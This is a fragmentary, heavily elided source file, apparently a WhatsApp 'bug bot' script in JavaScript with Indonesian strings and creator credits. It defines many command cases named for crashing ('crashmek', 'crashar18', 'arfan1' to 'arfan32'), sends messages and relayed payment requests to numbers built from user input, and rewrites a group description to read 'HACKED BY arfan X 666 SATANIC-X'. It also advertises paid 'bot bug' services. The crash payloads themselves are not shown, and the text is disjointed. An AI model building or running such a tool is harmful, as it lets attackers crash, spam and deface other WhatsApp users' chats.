...
› Create By Haikal
› Base Ori ArfanDev's
› Copyan Base ArfanDev's

🌷 KALAU MAU RENAME TARO CREDITS GUA : ArfanDev's */
...
//=================================================//
const reply = (teks) => {
return haikal.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `SC arfan `,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": kalimage,"sourceUrl": `https://wa.me/6285771061154`}}}, { quoted: m })} 
//=================================================//
try {
...
let user = global.db.data.users[m.sender]
m.reply(`
Hello Saya Bot arfan${user.afkReason ? ' Baiklah ' + user.afkReason : ''}
...
adehvn = { 
 ...
 arfan404.sendMessage(`${text}@s.whatsapp.net`, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: doc})
...
"amount1000": "100",
"extendedTextMessage": {
"text": `MY DEVELOPER arfan XHSAMERS X VIP`,
}
}}), { userJid: m.chat, quoted: doc})
haikal.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
...
//=================================================//
case '🌷': case 'crashmek': case 'ampunsuhu': case 'ahyangbetul': case 'okemek': case 'arfannih': case 'crashar18': case 'mexdemam': case 'arfan1': case 'arfan2': case 'arfan3': case 'arfan4': case 'arfan5': case 'arfan6': case 'arfan7': case 'arfan8': case 'arfan9': case 'arfan10': case 'arfan11': case 'arfan12': case 'arfan13': case 'arfan14': case 'arfan15': case 'arfan16': case 'arfan17': case 'arfan18': case 'arfan19': case 'arfan20': case 'arfan21': case 'arfan22': case 'arfan23': case 'arfan24': case 'arfan25': case 'arfan26': case 'arfan27': case 'arfan28':
case 'arfan29':
case 'arfan30':
case 'arfan31':
case 'arfan32':
...
user.afkReason = text
m.reply(`${m.pushName} Hello Saya Bot arfan${text ? ': ' + text : ''}`)
}
break
//=================================================//
//=================================================//
...
"title": `© arfandevs X VIP${ngazap(prefix)}`,
"description": `© arfandevs X VIP`,
"currencyCode": "IDR",
"footerText": `© arfandevs X VIP`,
"productImageCount": 1,
"firstImageId": 1,
"retailerId": `© arfan XHSAMERS X VIP WE ARE NOT MASTOD`,
"url": "wa.me/6285771061154"
},
...
case 'sc': {
if (isBan) throw sticBanLu(from)
reply('𝐏𝐑𝐎𝐌𝐎𝐓𝐄\n\nMau join own bug atau jadi bot bug murah meriah?bisa cp *arfan* harga terjangkau online 24×7 Jam, Free Akun Heroku Premium 100 Dynos,\n\nMinat?Pc *arfan wa.me/62882021734861*')
}
break
//=================================================//
case 'chat': {
...
await sleep(1000)
haikal.groupUpdateDescription(from, `_${pushname} HACKED BY arfan X 666 SATANIC-X_`)             
await sleep(1000)
...
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
Base Script
©zyy`, contextInfo:{"externalAdReply": {"title": ``,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://wa.me/6285771061154`,
thumbnailUrl: 'https://i.ibb.co/T1jCqF4/IMG-20221024-WA0002.jpg', 
...
╠➤ 𝐀𝐥𝐥 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 𝐁𝐨𝐭
╚════[ 𝕬𝖓𝖌𝖌𝖆 𝕾𝖆𝖙𝖆𝖓𝖎𝖈 ]══════⊱`,
contextInfo:{"externalAdReply": {"title": `arfan `,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://wa.me/6285771061154`,
thumbnailUrl: 'https://i.ibb.co/T1jCqF4/IMG-20221024-WA0002.jpg', 
...
kesel
ngeselin`,
contextInfo:{"externalAdReply": {"title": `SC arfan `,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://wa.me/6285771061154`,
thumbnailUrl: 'https://i.ibb.co/T1jCqF4/IMG-20221024-WA0002.jpg', 
